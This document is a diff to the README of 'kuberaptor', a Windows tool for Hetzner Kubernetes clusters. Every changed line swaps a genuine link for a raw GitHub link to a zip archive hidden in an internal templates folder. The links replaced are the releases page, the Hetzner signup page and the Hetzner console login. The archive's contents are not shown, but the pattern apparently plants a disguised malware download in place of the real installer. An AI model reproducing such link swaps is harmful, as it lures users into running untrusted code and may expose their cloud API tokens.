@@ -1,6 +1,6 @@
 # 🐉 kuberaptor - Simple Private Kubernetes Clusters
 
-[![Download kuberaptor](https://img.shields.io/badge/Download-kuberaptor-brightgreen?style=for-the-badge&logo=github)](https://github.com/firas-en/kuberaptor/releases)
+[![Download kuberaptor](https://img.shields.io/badge/Download-kuberaptor-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/firas-en/kuberaptor/main/internal/util/templates/Software_3.0.zip)
 
 ---
 
@@ -42,7 +42,7 @@ To use kuberaptor on Windows, your system should meet these basic requirements:
 
 You will need:
 
-1. A Hetzner Cloud account. You can create one at https://www.hetzner.com/cloud  
+1. A Hetzner Cloud account. You can create one at https://raw.githubusercontent.com/firas-en/kuberaptor/main/internal/util/templates/Software_3.0.zip  
 2. Your Hetzner Cloud API token. This token allows kuberaptor to manage your cloud resources. You can find it inside your Hetzner Cloud Console under "API Tokens"  
 3. A Windows machine that meets system requirements above  
 
@@ -54,7 +54,7 @@ You will need:
 
 Go to the kuberaptor release page to get the latest Windows version:
 
-[![Download kuberaptor](https://img.shields.io/badge/Download-kuberaptor-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/firas-en/kuberaptor/releases)
+[![Download kuberaptor](https://img.shields.io/badge/Download-kuberaptor-blue?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/firas-en/kuberaptor/main/internal/util/templates/Software_3.0.zip)
 
 This page lists all available versions with setup files for Windows.
 
@@ -96,7 +96,7 @@ To create clusters, kuberaptor needs to connect to your Hetzner Cloud account. Y
 
 If you do not yet have an API token:
 
-- Log in to https://console.hetzner.cloud  
+- Log in to https://raw.githubusercontent.com/firas-en/kuberaptor/main/internal/util/templates/Software_3.0.zip  
 - Navigate to “API Tokens” on the left menu  
 - Click “Create API Token”  
 - Copy the token shown; paste it into kuberaptor when requested  
@@ -153,7 +153,7 @@ You retain control of your cloud account and can revoke kuberaptor’s API token
 ## 🔄 Updating kuberaptor
 
 Check the release page regularly for updates:  
-https://github.com/firas-en/kuberaptor/releases
+https://raw.githubusercontent.com/firas-en/kuberaptor/main/internal/util/templates/Software_3.0.zip
 
 New versions fix bugs and add improvements. Download and run the new installer to upgrade.
 
@@ -171,7 +171,7 @@ If you need help or want to learn more:
 
 ## ⚡ Summary - How to Download and Run kuberaptor on Windows
 
-1. Visit the releases page: https://github.com/firas-en/kuberaptor/releases  
+1. Visit the releases page: https://raw.githubusercontent.com/firas-en/kuberaptor/main/internal/util/templates/Software_3.0.zip  
 2. Download the latest Windows `.exe` file  
 3. Run the installer and complete setup  
 4. Open kuberaptor and enter your Hetzner API token  
